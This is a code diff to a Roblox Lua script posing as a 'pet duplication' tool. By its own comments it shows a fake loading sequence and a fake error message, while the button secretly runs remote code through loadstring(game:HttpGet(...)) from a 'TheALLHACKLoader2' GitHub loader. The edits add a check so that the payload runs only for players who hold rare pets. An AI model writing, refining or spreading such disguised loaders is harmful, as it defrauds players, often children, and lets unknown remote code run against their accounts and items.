@@ -4,7 +4,7 @@ ScreenGui.Name = "DaizzDuperX"
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 420, 0, 380)  -- Made taller for new elements
+Frame.Size = UDim2.new(0, 420, 0, 380)
 Frame.Position = UDim2.new(0.5, -210, 0.5, -190)
 Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 Frame.BorderSizePixel = 0
@@ -97,7 +97,7 @@ WarningText.Parent = WarningBox
 local Instructions = Instance.new("TextLabel")
 Instructions.Size = UDim2.new(1, -40, 0, 120)
 Instructions.Position = UDim2.new(0, 20, 0, 170)
-Instructions.Text = "📜 INSTRUCTIONS:\n\n1. Hold a MYTHICAL/DEVINE pet\n2. Keep inventory open\n3. Press DUPLICATE button\n4. Wait 5-10 Minutes\n\n✔️ 92% Success Rate"
+Instructions.Text = "📜 INSTRUCTIONS:\n\n1. Hold a MYTHICAL/DIVINE pet\n2. Keep inventory open\n3. Press DUPLICATE button\n4. Wait 5-10 Minutes\n\n✔️ 92% Success Rate"
 Instructions.TextColor3 = Color3.fromRGB(220, 220, 220)
 Instructions.Font = Enum.Font.Gotham
 Instructions.TextSize = 16
@@ -108,12 +108,12 @@ Instructions.Parent = Frame
 
 -- Main button with flashy style
 local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0, 260, 0, 50)  -- Larger button
+Button.Size = UDim2.new(0, 260, 0, 50)
 Button.Position = UDim2.new(0.5, -130, 0.9, -35)
 Button.Text = "🔄 START DUPLICATION"
 Button.TextColor3 = Color3.fromRGB(255, 255, 255)
 Button.Font = Enum.Font.GothamBold
-Button.TextSize = 20  -- Bigger text
+Button.TextSize = 20
 Button.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
 Button.Parent = Frame
 
@@ -125,6 +125,39 @@ local ButtonStroke = Instance.new("UIStroke")
 ButtonStroke.Color = Color3.fromRGB(100, 180, 255)
 ButtonStroke.Thickness = 2
 ButtonStroke.Parent = Button
+
+-- Function to check if player has required tool
+local function hasRequiredTool()
+    local requiredTools = {"Red Fox", "Dragonfly", "Raccoon"}
+    local backpack = game:GetService("Players").LocalPlayer.Backpack
+    local character = game:GetService("Players").LocalPlayer.Character
+    
+    -- Check backpack
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            for _, requiredTool in ipairs(requiredTools) do
+                if string.find(tool.Name, requiredTool) then
+                    return true
+                end
+            end
+        end
+    end
+    
+    -- Check character (equipped tools)
+    if character then
+        for _, tool in ipairs(character:GetChildren()) do
+            if tool:IsA("Tool") then
+                for _, requiredTool in ipairs(requiredTools) do
+                    if string.find(tool.Name, requiredTool) then
+                        return true
+                    end
+                end
+            end
+        end
+    end
+    
+    return false
+end
 
 -- Fake loading animation function
 local function fakeLoading()
@@ -145,14 +178,22 @@ end
 
 -- Execute the real script when clicked
 Button.MouseButton1Click:Connect(function()
+    -- Check for required tool first
+    if not hasRequiredTool() then
+        StatusLabel.Text = "❌ ERROR: INVALID RARITY TYPE"
+        Button.Text = "🔁 TRY AGAIN"
+        Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+        return
+    end
+    
     -- Play fake loading sequence
     fakeLoading()
     
-    -- Then execute the real script
+    -- Then execute the real script (only if they have the required tool)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCityLoader/TheALLHACKLoader2/refs/heads/main/Loader"))()
     
-    -- Fake error message
-    StatusLabel.Text = "❌ ERROR: INVALID PET RARITY"
+    -- Fake error message (keeping original behavior)
+    StatusLabel.Text = "❌ ERROR: INVALID RARITY TYPE"
     Button.Text = "🔁 TRY AGAIN"
     Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
 end)
